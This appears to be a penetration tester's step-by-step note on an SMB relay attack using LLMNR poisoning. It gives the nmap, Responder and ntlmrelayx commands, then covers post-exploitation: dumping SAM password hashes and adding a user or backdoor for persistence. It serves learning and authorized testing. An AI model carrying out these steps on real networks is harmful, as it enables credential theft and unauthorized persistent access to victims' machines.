### **Pentest Note: SMB Relay Attack**

#### **1. Understanding SMB Relay and LLMNR Poisoning**
- **Overview:**
  - **SMB Relay:** An attack that relays NTLM authentication attempts from one machine to another, often with the goal of capturing credentials or executing code on the target. This is effective when SMB signing is disabled on the target machine.
  - **LLMNR Poisoning:** Used to trick a machine into sending NTLM credentials to a malicious server.

- **Pre-requisites:**
  - SMB signing must be disabled on the target machines.
  - The attacker must have administrative privileges on the relay target.

#### **2. Discovering Hosts with SMB Signing Disabled**
- **Nmap Scan for SMB Signing:**
  - **Command:**
    ```bash
    nmap --script smb2-security-mode.nse -p445 192.168.1.0/24
    ```
  - **Use Case:** Scans the network to identify hosts where SMB signing is disabled. These hosts are vulnerable to SMB relay attacks.

  - **Note on SMB Signing:**
    - **Workstations:** SMB signing is disabled by default.
    - **Servers:** SMB signing is enabled and required by default.

#### **3. Preparing the Environment for SMB Relay**

- **Create a List of Target IPs:**
  - **Command:**
    ```bash
    gedit targets.txt
    ```
  - **Use Case:** Create a file (`targets.txt`) containing the IP addresses of vulnerable hosts identified in the previous step.

- **Modify Responder Configuration:**
  - **Command:**
    ```bash
    gedit /etc/responder/Responder.conf
    ```
  - **Steps:**
    - Disable SMB and HTTP in Responder's configuration file to prevent conflicts with other tools.
    - Set Responder to listen but not respond to LLMNR/NBT-NS requests, allowing ntlmrelayx to handle the relaying.

- **Start Responder:**
  - **Command:**
    ```bash
    responder -I eth0 -rdwv
    ```
  - **Use Case:** Start Responder in listen mode to capture LLMNR/NBT-NS requests and relay them using ntlmrelayx.

#### **4. Configuring and Running the Relay Attack**

- **Configure ntlmrelayx for SMB Relay:**
  - **Command:**
    ```bash
    ntlmrelayx.py -tf targets.txt -smb2support
    ```
  - **Use Case:**
    - `-tf targets.txt`: Specifies the file containing the list of target IP addresses.
    - `-smb2support`: Enables support for SMB2, making the relay attack more versatile.
  
  - **Expected Outcome:**
    - If successful, ntlmrelayx will capture NTLM hashes and attempt to relay them to the targets specified. If the target allows SMB relay and the credentials have sufficient privileges, it can lead to actions such as dumping the SAM database.

#### **5. Post-Exploitation:**
- **Dumping the SAM Database:**
  - If the relay is successful and administrative access is gained, ntlmrelayx can be used to dump the Security Account Manager (SAM) database, which contains password hashes of local accounts.

- **Maintaining Access:**
  - Consider adding a new user or enabling a backdoor on the compromised machine to maintain persistence in the network.
